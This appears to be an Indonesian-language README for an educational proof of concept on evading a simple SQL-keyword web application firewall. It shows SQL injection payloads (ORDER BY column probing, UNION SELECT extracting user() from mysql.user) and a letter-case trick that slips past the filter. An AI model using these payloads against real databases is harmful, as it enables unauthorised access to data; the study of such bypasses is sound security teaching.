# Bypass SQL Web Application Firewall

_Proof of Concept_ untuk Bypass WAF berbasis SQL, untuk keperluan Pembelajaran Saja.

```sh
php sql-waf.php
```

![Demonstrasi Bypass WAF](demo.gif)

### Proof of Concept

 !!! Query Berikut dapat bervariasi, tergantung komputer anda. !!!

```sql
-- Contoh Query Sebuah Baris dengan 3 output
SELECT * FROM `table_name` WHERE `id` = 1337;

-- Contoh Query yang di-inject
SELECT * FROM `table_name` WHERE `id` = 1 ORDER BY 3; -- Estimasi Jumlah Tabel
SELECT * FROM `table_name` WHERE `id` =-1 UNION SELECT 1, user(), 3 FROM mysql.user; -- Mendapatkan User yang digunakan oleh Koneksi SQL
```

Dari Gateway bisa saja Memblokir Query yang mengandung resiko, ini adalah contoh WAF yang sederhana, dan kita dapat mencoba menerobos filter ini dengan menyuntik Query itu dengan query yang lainnya.

```sql
-- Contoh Kasus: function user di filter

SELECT * FROM `table_name` WHERE `id` =-1 UNION SELECT 1, user(), 3 FROM mysql.user; -- Output: Error

-- Contoh Query yang dapat menerobos filter ini
SELECT * FROM `table_name` WHERE `id` =-1 UNION SELECT 1, uSeR(), 3 FROM mysql.user; -- Output: user@localhost
```  
